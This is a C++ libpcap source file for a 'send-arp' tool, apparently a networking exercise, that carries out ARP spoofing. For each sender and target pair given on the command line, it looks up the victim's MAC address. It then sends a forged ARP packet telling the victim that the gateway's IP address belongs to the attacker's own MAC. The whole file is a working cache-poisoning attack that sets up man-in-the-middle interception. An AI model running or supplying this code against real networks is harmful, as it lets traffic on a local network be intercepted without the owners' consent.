#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include<arpa/inet.h>
#include <ifaddrs.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <vector>

using namespace std;

std::string getMacAddress(const std::string& interfaceName) {
    std::ifstream file("/sys/class/net/" + interfaceName + "/address");
    if (!file) {
        std::cerr << "Failed to open file: /sys/class/net/" << interfaceName << "/address" << std::endl;
        return "";
    }

    std::stringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

std::string getIpAddress(const std::string& interfaceName) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interfaceName.c_str(), IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
    string interfaceName = argv[1];
    string macAddress = getMacAddress(interfaceName);
    string ipAddress = getIpAddress(interfaceName);

    cout << "MAC Address: " << macAddress << endl;
    cout << "IP Address: " << ipAddress << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    for(int i = 2; i < argc - 1; i += 2) {
        //~ Your existing code follows
        //~ Change the usage of argv[2] and argv[3] to argv[i] and argv[i+1] respectively
        //~ This will process each pair of sender/target IPs specified in the command line arguments
	string interfaceName = argv[1];
    string macAddress = getMacAddress(interfaceName);
    string ipAddress = getIpAddress(interfaceName);

    cout<<macAddress<<endl;
    cout << "IP Address: " << ipAddress << endl;
	EthArpPacket packet;

	packet.eth_.smac_ = Mac();//ME
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//BORADCAST
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(macAddress);//MY MAC
	packet.arp_.sip_ = htonl(Ip(ipAddress));//MY IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//WHAT IS THE MAC?
	packet.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	//packet's mac address
	
	//printf("Target MAC address: %s\n", static_cast<std::string>(packet.arp_.tmac_).c_str());
	
	struct pcap_pkthdr* header;
  	const u_char* reply_packet;
	
	EthArpPacket* reply =nullptr;

	while (true) {
    	int ret = pcap_next_ex(handle, &header, &reply_packet);
    	if (ret == 0) {
        		printf("Timeout, no packet received\n");
        		continue;
    	}
    	if (ret == -1 || ret == -2) {
     	// Error or EOF, break the loop
	    		fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
        	break;
    	}

    	// 해석된 패킷을 출력합니다.

    	reply = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet));
    	if (reply->eth_.type_ == htons(EthHdr::Arp) &&
    		reply->arp_.op_ == htons(ArpHdr::Reply) &&
        		reply->arp_.sip_ == packet.arp_.tip_) {
        printf("Received ARP reply from %s with MAC address: %s",
              static_cast<std::string>(reply->arp_.sip_).c_str(),
    	        static_cast<std::string>(reply->arp_.smac_).c_str());
   			break; // Break the loop as we found the ARP reply we were looking for
	} else {
      	printf("Not the ARP reply\n");
 	     }	
	}

	EthArpPacket fpacket;

	fpacket.eth_.smac_ = Mac(macAddress);//ME
	fpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");//BORADCAST
	fpacket.eth_.type_ = htons(EthHdr::Arp);

	fpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	fpacket.arp_.pro_ = htons(EthHdr::Ip4);
	fpacket.arp_.hln_ = Mac::SIZE;
	fpacket.arp_.pln_ = Ip::SIZE;
	fpacket.arp_.op_ = htons(ArpHdr::Request);
	fpacket.arp_.smac_ = Mac(macAddress);//MY MAC
	fpacket.arp_.sip_ = htonl(Ip(argv[i+1]));//gateway ip
	fpacket.arp_.tmac_ = reply->arp_.smac_;//WHAT IS THE MAC?
	fpacket.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP


	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fpacket), sizeof(EthArpPacket));
  if (res != 0) {
      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
  }
    }

    pcap_close(handle);

    return 0;
}
